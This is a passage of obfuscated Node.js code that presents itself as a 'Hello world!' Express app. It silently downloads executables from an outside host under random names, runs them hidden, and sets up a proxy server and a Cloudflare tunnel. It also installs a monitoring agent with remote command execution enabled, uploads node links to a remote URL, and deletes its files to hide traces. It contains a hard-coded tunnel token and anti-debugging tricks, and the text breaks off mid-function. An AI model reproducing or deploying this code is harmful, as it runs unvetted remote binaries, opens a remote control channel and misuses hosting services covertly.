const _0x52af72=_0x20ac;(function(_0x1c7a0d,_0x4f16da){const _0x3b2ec6=_0x20ac,_0x51e6b9=_0x1c7a0d();while(!![]){try{const _0x524538=parseInt(_0x3b2ec6(0xcc))/0x1*(parseInt(_0x3b2ec6(0x170))/0x2)+-parseInt(_0x3b2ec6(0x15c))/0x3*(-parseInt(_0x3b2ec6(0x17e))/0x4)+parseInt(_0x3b2ec6(0xd1))/0x5+parseInt(_0x3b2ec6(0xfc))/0x6+-parseInt(_0x3b2ec6(0xce))/0x7*(parseInt(_0x3b2ec6(0x14c))/0x8)+parseInt(_0x3b2ec6(0x121))/0x9*(parseInt(_0x3b2ec6(0xe6))/0xa)+-parseInt(_0x3b2ec6(0xcd))/0xb;if(_0x524538===_0x4f16da)break;else _0x51e6b9['push'](_0x51e6b9['shift']());}catch(_0x553cd5){_0x51e6b9['push'](_0x51e6b9['shift']());}}}(_0x116e,0xa900e));function _0x116e(){const _0x52ff39=['quic','ARGO_AUTH','message','log','stringify','match','existsSync','/vmess-argo','ARGO_DOMAIN','length','floor','test','.exe\x20>\x20nul\x202>&1','2358zXTjdB','application/json','listen','statSync','\x0a\x20\x20credentials-file:\x20','/dev/null','./tmp','send','vless','Empowerment\x20failed\x20for\x20','includes','/trojan-argo','/api/delete-nodes','https://amd64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1','443','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','toString','\x0avless://','get','pkill\x20-f\x20\x22[','https://arm64.ssss.nyc.mn/agent','boot.log','readFileSync','&path=%2Ftrojan-argo%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel.yml','console','catch','tcp','NAME','constructor','base64','admin','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x22\x20>\x20/dev/null\x202>&1','post','unshift','tls','direct','/api/add-subscriptions','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','16tPBAMz','del\x20/f\x20/q\x20','prototype','config.yaml','vmess','/config.json\x20>/dev/null\x202>&1\x20&','PORT','arm','railway.251127.xyz','http','Subscription\x20uploaded\x20successfully','child_process','rm\x20-rf\x20','split','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','AUTO_ACCESS','74901EcoXXx','unlink','response','https://arm64.ssss.nyc.mn/web','NEZHA\x20variable\x20is\x20empty,skip\x20running','trim','\x20failed:\x20','clear','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','&fp=firefox&type=ws&host=','\x20-c\x20','Empowerment\x20success\x20for\x20','true','FILE_PATH','join','firefox','tunnel.json','env','https://amd64.ssss.nyc.mn/web','?security=tls&sni=','10uZsKsE','ArgoDomain:','mkdirSync','98e310f9-0d78-4663-a9bf-c743a9e37115','\x20already\x20exists','set','push','\x0a\x20\x20\x20\x20','info','&path=%2Fvless-argo%3Fed%3D2560#','arch','substring','Error\x20in\x20startserver:','Content-Type','100uryHFZ','2083','NEZHA_SERVER','npm\x20running\x20error:\x20','path','warn','App\x20is\x20running','stream','xtls-rprx-vision','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','www.visa.com.sg','apply','filter','basename','\x20successfully','abcdefghijklmnopqrstuvwxyz','exec','util','Error\x20executing\x20command:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','blackhole','126081GTtirV','20206604LcdlAQ','2467178erAvjP','forEach','PROJECT_URL','4622000GvzFrD','config.json','(((.+)+)+)+$','?encryption=none&security=tls&sni=','charAt','127.0.0.1','/vless-argo','list.txt','platform','/api/add-nodes','search','bind','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','2053','data','https+local://8.8.8.8/dns-query','nohup\x20','trojan','text/plain;\x20charset=utf-8','\x20-s\x20','\x0aclient_secret:\x20','31330EmzYGy','ARGO_DOMAIN:','\x20is\x20created','table','\x20is\x20running','https://oooo.serv00.net/add-url','readdirSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','automatic\x20access\x20task\x20added\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','from','Unhandled\x20error\x20in\x20startserver:','has','all','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','fileUrl','ARGO_PORT','Download\x20','8443','2096','\x20>\x20nul\x202>&1','\x0a\x20\x20\x0atrojan://','1405704lcMHkm','aarch64','sub.txt','SERVER_PORT','win32','exception','NEZHA_KEY','none','status','CFPORT','freedom','/tunnel.yml\x20run','__proto__','finish','isFile','\x0a\x20\x20\x0avmess://','error','2087','writeFileSync','https://arm64.ssss.nyc.mn/v1','random','utf-8','axios','false'];_0x116e=function(){return _0x52ff39;};return _0x116e();}const _0x42fa9b=(function(){let _0x19825b=!![];return function(_0x1abf35,_0x5efffd){const _0x576607=_0x19825b?function(){const _0xdbac95=_0x20ac;if(_0x5efffd){const _0x5f243a=_0x5efffd[_0xdbac95(0x189)](_0x1abf35,arguments);return _0x5efffd=null,_0x5f243a;}}:function(){};return _0x19825b=![],_0x576607;};}()),_0x30a566=_0x42fa9b(this,function(){const _0x207276=_0x20ac;return _0x30a566[_0x207276(0x133)]()[_0x207276(0xdb)](_0x207276(0xd3))[_0x207276(0x133)]()[_0x207276(0x141)](_0x30a566)[_0x207276(0xdb)](_0x207276(0xd3));});_0x30a566();const _0x2674fd=(function(){let _0x2b4199=!![];return function(_0xdcca80,_0x3f8ae0){const _0x62be61=_0x2b4199?function(){const _0x18c5fb=_0x20ac;if(_0x3f8ae0){const _0x1436c8=_0x3f8ae0[_0x18c5fb(0x189)](_0xdcca80,arguments);return _0x3f8ae0=null,_0x1436c8;}}:function(){};return _0x2b4199=![],_0x62be61;};}()),_0x4ca023=_0x2674fd(this,function(){const _0x55ebc0=_0x20ac,_0x213832=function(){let _0x1f24ae;try{_0x1f24ae=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x26cad2){_0x1f24ae=window;}return _0x1f24ae;},_0x3e384a=_0x213832(),_0x19ec31=_0x3e384a[_0x55ebc0(0x13d)]=_0x3e384a[_0x55ebc0(0x13d)]||{},_0x198cfe=[_0x55ebc0(0x117),_0x55ebc0(0x183),_0x55ebc0(0x178),_0x55ebc0(0x10c),_0x55ebc0(0x101),_0x55ebc0(0xe9),'trace'];for(let _0xa1e174=0x0;_0xa1e174<_0x198cfe[_0x55ebc0(0x11d)];_0xa1e174++){const _0x5df0a2=_0x2674fd[_0x55ebc0(0x141)][_0x55ebc0(0x14e)][_0x55ebc0(0xdc)](_0x2674fd),_0x1717de=_0x198cfe[_0xa1e174],_0x598ae2=_0x19ec31[_0x1717de]||_0x5df0a2;_0x5df0a2[_0x55ebc0(0x108)]=_0x2674fd[_0x55ebc0(0xdc)](_0x2674fd),_0x5df0a2[_0x55ebc0(0x133)]=_0x598ae2[_0x55ebc0(0x133)][_0x55ebc0(0xdc)](_0x598ae2),_0x19ec31[_0x1717de]=_0x5df0a2;}});_0x4ca023();const express=require('express'),app=express(),axios=require(_0x52af72(0x112)),os=require('os'),fs=require('fs'),path=require(_0x52af72(0x182)),{promisify}=require(_0x52af72(0xc8)),exec=promisify(require(_0x52af72(0x157))[_0x52af72(0xc7)]),{execSync}=require(_0x52af72(0x157)),UPLOAD_URL=process[_0x52af72(0x16d)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x52af72(0x16d)][_0x52af72(0xd0)]||'',AUTO_ACCESS=process['env'][_0x52af72(0x15b)]||![],FILE_PATH=process[_0x52af72(0x16d)][_0x52af72(0x169)]||_0x52af72(0x127),SUB_PATH=process[_0x52af72(0x16d)]['SUB_PATH']||_0x52af72(0x143),PORT=process[_0x52af72(0x16d)][_0x52af72(0xff)]||process['env'][_0x52af72(0x152)]||0xbb8,UUID=process[_0x52af72(0x16d)]['UUID']||_0x52af72(0x173),NEZHA_SERVER=process['env'][_0x52af72(0x180)]||'',NEZHA_PORT=process[_0x52af72(0x16d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x52af72(0x16d)][_0x52af72(0x102)]||'',ARGO_DOMAIN=process[_0x52af72(0x16d)][_0x52af72(0x11c)]||_0x52af72(0x154),ARGO_AUTH=process['env'][_0x52af72(0x115)]||'eyJhIjoiZjI0NzQyYzEzMzQ1NjhmMGM0N2NmOTQ3MDI4OTYyYWIiLCJ0IjoiMjg3YjE1NDQtNTViNC00YWE0LWI1MTEtMDgyNjg0NzhhNGQ2IiwicyI6IllXRTRZMk16Tm1NdE1UZGtPUzAwTlRCa0xXRXlOR1F0T0RaaVlURTBOak5pWlRjeCJ9',ARGO_PORT=process[_0x52af72(0x16d)][_0x52af72(0xf6)]||0x1f41,CFIP=process[_0x52af72(0x16d)]['CFIP']||_0x52af72(0x188),CFPORT=process[_0x52af72(0x16d)][_0x52af72(0x105)]||0x1bb,NAME=process[_0x52af72(0x16d)][_0x52af72(0x140)]||'railway';function _0x20ac(_0x4c454e,_0x1c8c3c){const _0x1b4121=_0x116e();return _0x20ac=function(_0x4ca023,_0x2674fd){_0x4ca023=_0x4ca023-0xc7;let _0x4625ad=_0x1b4121[_0x4ca023];return _0x4625ad;},_0x20ac(_0x4c454e,_0x1c8c3c);}!fs[_0x52af72(0x11a)](FILE_PATH)?(fs[_0x52af72(0x172)](FILE_PATH),console[_0x52af72(0x117)](FILE_PATH+_0x52af72(0xe8))):console['log'](FILE_PATH+_0x52af72(0x174));function generateRandomName(){const _0x4f7c64=_0x52af72,_0x130915=_0x4f7c64(0x18d);let _0x3020a2='';for(let _0x5c7ba4=0x0;_0x5c7ba4<0x6;_0x5c7ba4++){_0x3020a2+=_0x130915[_0x4f7c64(0xd5)](Math[_0x4f7c64(0x11e)](Math[_0x4f7c64(0x110)]()*_0x130915['length']));}return _0x3020a2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x52af72(0x16a)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x52af72(0xfe)),listPath=path[_0x52af72(0x16a)](FILE_PATH,_0x52af72(0xd8)),bootLogPath=path[_0x52af72(0x16a)](FILE_PATH,_0x52af72(0x138)),configPath=path['join'](FILE_PATH,_0x52af72(0xd2));function deleteNodes(){const _0x336070=_0x52af72;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x545805;try{_0x545805=fs[_0x336070(0x139)](subPath,'utf-8');}catch{return null;}const _0x4bc9c7=Buffer[_0x336070(0xf0)](_0x545805,_0x336070(0x142))['toString']('utf-8'),_0xf64ee8=_0x4bc9c7[_0x336070(0x159)]('\x0a')[_0x336070(0x18a)](_0x305c7f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x336070(0x11f)](_0x305c7f));if(_0xf64ee8['length']===0x0)return;return axios[_0x336070(0x146)](UPLOAD_URL+_0x336070(0x12d),JSON[_0x336070(0x118)]({'nodes':_0xf64ee8}),{'headers':{'Content-Type':_0x336070(0x122)}})[_0x336070(0x13e)](_0x3df930=>{return null;}),null;}catch(_0x5db96d){return null;}}function cleanupOldFiles(){const _0xcd4583=_0x52af72;try{const _0x295e41=fs[_0xcd4583(0xec)](FILE_PATH);_0x295e41[_0xcd4583(0xcf)](_0x588b16=>{const _0x569fdb=_0xcd4583,_0x241a83=path[_0x569fdb(0x16a)](FILE_PATH,_0x588b16);try{const _0x42a79f=fs[_0x569fdb(0x124)](_0x241a83);_0x42a79f[_0x569fdb(0x10a)]()&&fs['unlinkSync'](_0x241a83);}catch(_0x478fb1){}});}catch(_0x6abc0c){}}app['get']('/',function(_0x5e742d,_0x42ce29){_0x42ce29['send']('Hello\x20world!');});async function generateConfig(){const _0x1ebb03=_0x52af72,_0x266aff={'log':{'access':_0x1ebb03(0x126),'error':_0x1ebb03(0x126),'loglevel':_0x1ebb03(0x103)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1ebb03(0x129),'settings':{'clients':[{'id':UUID,'flow':_0x1ebb03(0x186)}],'decryption':_0x1ebb03(0x103),'fallbacks':[{'dest':0xbb9},{'path':_0x1ebb03(0xd7),'dest':0xbba},{'path':_0x1ebb03(0x11b),'dest':0xbbb},{'path':_0x1ebb03(0x12c),'dest':0xbbc}]},'streamSettings':{'network':_0x1ebb03(0x13f)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1ebb03(0x103)},'streamSettings':{'network':_0x1ebb03(0x13f),'security':_0x1ebb03(0x103)}},{'port':0xbba,'listen':_0x1ebb03(0xd6),'protocol':_0x1ebb03(0x129),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1ebb03(0x103)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1ebb03(0xd7)}},'sniffing':{'enabled':!![],'destOverride':[_0x1ebb03(0x155),_0x1ebb03(0x148),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1ebb03(0xd6),'protocol':_0x1ebb03(0x150),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1ebb03(0x155),_0x1ebb03(0x148),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1ebb03(0xd6),'protocol':_0x1ebb03(0xe2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1ebb03(0x103),'wsSettings':{'path':_0x1ebb03(0x12c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1ebb03(0x148),_0x1ebb03(0x114)],'metadataOnly':![]}}],'dns':{'servers':[_0x1ebb03(0xe0)]},'outbounds':[{'protocol':_0x1ebb03(0x106),'tag':_0x1ebb03(0x149)},{'protocol':_0x1ebb03(0xcb),'tag':'block'}]};fs[_0x1ebb03(0x10e)](path[_0x1ebb03(0x16a)](FILE_PATH,_0x1ebb03(0xd2)),JSON[_0x1ebb03(0x118)](_0x266aff,null,0x2));}function getSystemArchitecture(){const _0x52c6c2=_0x52af72,_0x8e6eea=os[_0x52c6c2(0x17a)]();return _0x8e6eea==='arm'||_0x8e6eea==='arm64'||_0x8e6eea===_0x52c6c2(0xfd)?_0x52c6c2(0x153):'amd';}function downloadFile(_0x4f4e72,_0xb70bb2,_0x57e492){const _0x149a63=_0x52af72,_0x5bdbea=_0x4f4e72;!fs[_0x149a63(0x11a)](FILE_PATH)&&fs[_0x149a63(0x172)](FILE_PATH,{'recursive':!![]});const _0x749cee=fs['createWriteStream'](_0x5bdbea);axios({'method':_0x149a63(0x135),'url':_0xb70bb2,'responseType':_0x149a63(0x185)})['then'](_0x3c8863=>{const _0x8d8389=_0x149a63;_0x3c8863[_0x8d8389(0xdf)]['pipe'](_0x749cee),_0x749cee['on'](_0x8d8389(0x109),()=>{const _0x98a90b=_0x8d8389;_0x749cee['close'](),console['log']('Download\x20'+path['basename'](_0x5bdbea)+_0x98a90b(0x18c)),_0x57e492(null,_0x5bdbea);}),_0x749cee['on'](_0x8d8389(0x10c),_0x17038b=>{const _0x58cbf2=_0x8d8389;fs[_0x58cbf2(0x15d)](_0x5bdbea,()=>{});const _0x4f24a9=_0x58cbf2(0xf7)+path['basename'](_0x5bdbea)+_0x58cbf2(0x162)+_0x17038b[_0x58cbf2(0x116)];console[_0x58cbf2(0x10c)](_0x4f24a9),_0x57e492(_0x4f24a9);});})[_0x149a63(0x13e)](_0x3bd829=>{const _0x3076ec=_0x149a63,_0x32b06c=_0x3076ec(0xf7)+path[_0x3076ec(0x18b)](_0x5bdbea)+_0x3076ec(0x162)+_0x3bd829[_0x3076ec(0x116)];console['error'](_0x32b06c),_0x57e492(_0x32b06c);});}async function downloadFilesAndRun(){const _0x17523a=_0x52af72,_0x566792=getSystemArchitecture(),_0x265735=getFilesForArchitecture(_0x566792);if(_0x265735[_0x17523a(0x11d)]===0x0){console[_0x17523a(0x117)](_0x17523a(0x13b));return;}const _0xd4cc0b=_0x265735['map'](_0x43e4af=>{return new Promise((_0x24a016,_0xbb0f94)=>{const _0x24cc33=_0x20ac;downloadFile(_0x43e4af['fileName'],_0x43e4af[_0x24cc33(0xf5)],(_0xb9a499,_0x42590d)=>{_0xb9a499?_0xbb0f94(_0xb9a499):_0x24a016(_0x42590d);});});});try{await Promise[_0x17523a(0xf3)](_0xd4cc0b);}catch(_0x1828e2){console['error']('Error\x20downloading\x20files:',_0x1828e2);return;}function _0x420d4d(_0x2242a2){const _0x3f45e5=0x1fd;_0x2242a2['forEach'](_0xb13777=>{fs['existsSync'](_0xb13777)&&fs['chmod'](_0xb13777,_0x3f45e5,_0xb8ef89=>{const _0x5b3913=_0x20ac;_0xb8ef89?console[_0x5b3913(0x10c)](_0x5b3913(0x12a)+_0xb13777+':\x20'+_0xb8ef89):console[_0x5b3913(0x117)](_0x5b3913(0x167)+_0xb13777+':\x20'+_0x3f45e5[_0x5b3913(0x133)](0x8));});});}const _0x12d8b9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x420d4d(_0x12d8b9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13d389=NEZHA_SERVER[_0x17523a(0x12b)](':')?NEZHA_SERVER[_0x17523a(0x159)](':')['pop']():'',_0x583d94=new Set([_0x17523a(0x130),'8443',_0x17523a(0xf9),_0x17523a(0x10d),_0x17523a(0x17f),'2053']),_0x1e7831=_0x583d94[_0x17523a(0xf2)](_0x13d389)?_0x17523a(0x168):_0x17523a(0x113),_0x456968=_0x17523a(0xe5)+NEZHA_KEY+_0x17523a(0xed)+NEZHA_SERVER+_0x17523a(0xf4)+_0x1e7831+_0x17523a(0x15a)+UUID;fs[_0x17523a(0x10e)](path[_0x17523a(0x16a)](FILE_PATH,_0x17523a(0x14f)),_0x456968);const _0x11db1f=_0x17523a(0xe1)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x11db1f),console[_0x17523a(0x117)](phpName+_0x17523a(0xea)),await new Promise(_0x1215b6=>setTimeout(_0x1215b6,0x3e8));}catch(_0x1f0fd0){console[_0x17523a(0x10c)]('php\x20running\x20error:\x20'+_0x1f0fd0);}}else{let _0x538175='';const _0x327255=['443',_0x17523a(0xf8),_0x17523a(0xf9),_0x17523a(0x10d),_0x17523a(0x17f),_0x17523a(0xde)];_0x327255[_0x17523a(0x12b)](NEZHA_PORT)&&(_0x538175='--tls');const _0x4f3280=_0x17523a(0xe1)+npmPath+_0x17523a(0xe4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x538175+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4f3280),console[_0x17523a(0x117)](npmName+_0x17523a(0xea)),await new Promise(_0x1aa2e7=>setTimeout(_0x1aa2e7,0x3e8));}catch(_0x56c57b){console['error'](_0x17523a(0x181)+_0x56c57b);}}}else console[_0x17523a(0x117)](_0x17523a(0x160));const _0x1e9807='nohup\x20'+webPath+_0x17523a(0x166)+FILE_PATH+_0x17523a(0x151);try{await exec(_0x1e9807),console[_0x17523a(0x117)](webName+_0x17523a(0xea)),await new Promise(_0x1c0162=>setTimeout(_0x1c0162,0x3e8));}catch(_0x2f46b6){console[_0x17523a(0x10c)]('web\x20running\x20error:\x20'+_0x2f46b6);}if(fs['existsSync'](botPath)){let _0x10dbe9;if(ARGO_AUTH[_0x17523a(0x119)](/^[A-Z0-9a-z=]{120,250}$/))_0x10dbe9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x17523a(0x119)](/TunnelSecret/)?_0x10dbe9='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x17523a(0x107):_0x10dbe9=_0x17523a(0xca)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x17523a(0xe1)+botPath+'\x20'+_0x10dbe9+'\x20>/dev/null\x202>&1\x20&'),console[_0x17523a(0x117)](botName+_0x17523a(0xea)),await new Promise(_0x12e082=>setTimeout(_0x12e082,0x7d0));}catch(_0xb141a1){console[_0x17523a(0x10c)](_0x17523a(0xc9)+_0xb141a1);}}await new Promise(_0x1a8ce4=>setTimeout(_0x1a8ce4,0x1388));}function getFilesForArchitecture(_0x1686b8){const _0x442457=_0x52af72;let _0x4809b9;_0x1686b8==='arm'?_0x4809b9=[{'fileName':webPath,'fileUrl':_0x442457(0x15f)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x4809b9=[{'fileName':webPath,'fileUrl':_0x442457(0x16e)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x252018=_0x1686b8===_0x442457(0x153)?_0x442457(0x137):'https://amd64.ssss.nyc.mn/agent';_0x4809b9[_0x442457(0x147)]({'fileName':npmPath,'fileUrl':_0x252018});}else{const _0x502d6e=_0x1686b8===_0x442457(0x153)?_0x442457(0x10f):_0x442457(0x12e);_0x4809b9[_0x442457(0x147)]({'fileName':phpPath,'fileUrl':_0x502d6e});}}return _0x4809b9;}function argoType(){const _0xcfcebc=_0x52af72;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xcfcebc(0x117)](_0xcfcebc(0xef));return;}if(ARGO_AUTH[_0xcfcebc(0x12b)](_0xcfcebc(0x131))){fs[_0xcfcebc(0x10e)](path[_0xcfcebc(0x16a)](FILE_PATH,_0xcfcebc(0x16c)),ARGO_AUTH);const _0x438a1e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0xcfcebc(0x125)+path[_0xcfcebc(0x16a)](FILE_PATH,_0xcfcebc(0x16c))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xcfcebc(0x14b)+ARGO_PORT+_0xcfcebc(0x132);fs[_0xcfcebc(0x10e)](path[_0xcfcebc(0x16a)](FILE_PATH,_0xcfcebc(0x13c)),_0x438a1e);}else console[_0xcfcebc(0x117)](_0xcfcebc(0x164));}argoType();async function extractDomains(){const _0x54a714=_0x52af72;let _0x101995;if(ARGO_AUTH&&ARGO_DOMAIN)_0x101995=ARGO_DOMAIN,console[_0x54a714(0x117)](_0x54a714(0xe7),_0x101995),await _0x15bf30(_0x101995);else try{const _0x34bd29=fs[_0x54a714(0x139)](path['join'](FILE_PATH,_0x54a714(0x138)),_0x54a714(0x111)),_0x47925b=_0x34bd29['split']('\x0a'),_0x40d8d7=[];_0x47925b[_0x54a714(0xcf)](_0x3e3d31=>{const _0x1206b9=_0x54a714,_0x45084e=_0x3e3d31[_0x1206b9(0x119)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x45084e){const _0x224c0d=_0x45084e[0x1];_0x40d8d7[_0x1206b9(0x176)](_0x224c0d);}});if(_0x40d8d7['length']>0x0)_0x101995=_0x40d8d7[0x0],console[_0x54a714(0x117)](_0x54a714(0x171),_0x101995),await _0x15bf30(_0x101995);else{console[_0x54a714(0x117)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x54a714(0x16a)](FILE_PATH,_0x54a714(0x138)));async function _0x2569e5(){const _0x18e514=_0x54a714;try{process[_0x18e514(0xd9)]===_0x18e514(0x100)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x18e514(0x120)):await exec(_0x18e514(0x136)+botName[_0x18e514(0xd5)](0x0)+']'+botName[_0x18e514(0x17b)](0x1)+_0x18e514(0x145));}catch(_0x276104){}}_0x2569e5(),await new Promise(_0x15341f=>setTimeout(_0x15341f,0xbb8));const _0x2a6a34='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x54a714(0x144)+ARGO_PORT;try{await exec(_0x54a714(0xe1)+botPath+'\x20'+_0x2a6a34+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x54a714(0xea)),await new Promise(_0x164df2=>setTimeout(_0x164df2,0xbb8)),await extractDomains();}catch(_0x72137c){console[_0x54a714(0x10c)](_0x54a714(0xc9)+_0x72137c);}}}catch(_0x5659d3){console[_0x54a714(0x10c)]('Error\x20reading\x20boot.log:',_0x5659d3);}async function _0x15bf30(_0xe38b0c){const _0xc9c836=_0x54a714,_0x21e9df=execSync(_0xc9c836(0xdd),{'encoding':_0xc9c836(0x111)}),_0x328ac0=_0x21e9df[_0xc9c836(0x161)](),_0x377b9a=NAME?NAME+'-'+_0x328ac0:_0x328ac0;return new Promise(_0x52541d=>{setTimeout(()=>{const _0x3607af=_0x20ac,_0x59fb33={'v':'2','ps':''+_0x377b9a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3607af(0x103),'net':'ws','type':_0x3607af(0x103),'host':_0xe38b0c,'path':'/vmess-argo?ed=2560','tls':_0x3607af(0x148),'sni':_0xe38b0c,'alpn':'','fp':_0x3607af(0x16b)},_0x1e6e7c=_0x3607af(0x134)+UUID+'@'+CFIP+':'+CFPORT+_0x3607af(0xd4)+_0xe38b0c+_0x3607af(0x165)+_0xe38b0c+_0x3607af(0x179)+_0x377b9a+_0x3607af(0x10b)+Buffer[_0x3607af(0xf0)](JSON['stringify'](_0x59fb33))[_0x3607af(0x133)](_0x3607af(0x142))+_0x3607af(0xfb)+UUID+'@'+CFIP+':'+CFPORT+_0x3607af(0x16f)+_0xe38b0c+_0x3607af(0x165)+_0xe38b0c+_0x3607af(0x13a)+_0x377b9a+_0x3607af(0x177);console[_0x3607af(0x117)](Buffer[_0x3607af(0xf0)](_0x1e6e7c)[_0x3607af(0x133)]('base64')),fs[_0x3607af(0x10e)](subPath,Buffer[_0x3607af(0xf0)](_0x1e6e7c)[_0x3607af(0x133)]('base64')),console[_0x3607af(0x117)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3607af(0x135)]('/'+SUB_PATH,(_0x4a8557,_0x2a1d06)=>{const _0x3e8194=_0x3607af,_0x3a071a=Buffer[_0x3e8194(0xf0)](_0x1e6e7c)[_0x3e8194(0x133)]('base64');_0x2a1d06[_0x3e8194(0x175)](_0x3e8194(0x17d),_0x3e8194(0xe3)),_0x2a1d06[_0x3e8194(0x128)](_0x3a071a);}),_0x52541d(_0x1e6e7c);},0x7d0);});}}async function uploadNodes(){const _0x15c0d7=_0x52af72;if(UPLOAD_URL&&PROJECT_URL){const _0x2edd98=PROJECT_URL+'/'+SUB_PATH,_0x1217ee={'subscription':[_0x2edd98]};try{const _0x828d93=await axios[_0x15c0d7(0x146)](UPLOAD_URL+_0x15c0d7(0x14a),_0x1217ee,{'headers':{'Content-Type':_0x15c0d7(0x122)}});return _0x828d93&&_0x828d93['status']===0xc8?(console['log'](_0x15c0d7(0x156)),_0x828d93):null;}catch(_0xbc9848){if(_0xbc9848[_0x15c0d7(0x15e)]){if(_0xbc9848[_0x15c0d7(0x15e)][_0x15c0d7(0x104)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x15c0d7(0x11a)](listPath))return;const _0x11e869=fs['readFileSync'](listPath,_0x15c0d7(0x111)),_0x4f08c1=_0x11e869[_0x15c0d7(0x159)]('\x0a')[_0x15c0d7(0x18a)](_0x4b4a78=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15c0d7(0x11f)](_0x4b4a78));if(_0x4f08c1[_0x15c0d7(0x11d)]===0x0)return;const _0x3fe0e0=JSON['stringify']({'nodes':_0x4f08c1});try{const _0x3e01bc=await axios[_0x15c0d7(0x146)](UPLOAD_URL+_0x15c0d7(0xda),_0x3fe0e0,{'headers':{'Content-Type':'application/json'}});return _0x3e01bc&&_0x3e01bc[_0x15c0d7(0x104)]===0xc8?(console[_0x15c0d7(0x117)]('Nodes\x20uploaded\x20successfully'),_0x3e01bc):null;}catch(_0x933bc2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5a3deb=_0x20ac,_0x59f62f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x59f62f[_0x5a3deb(0x176)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x59f62f[_0x5a3deb(0x176)](phpPath);process[_0x5a3deb(0xd9)]===_0x5a3deb(0x100)?exec(_0x5a3deb(0x14d)+_0x59f62f[_0x5a3deb(0x16a)]('\x20')+_0x5a3deb(0xfa),_0x2383c5=>{const 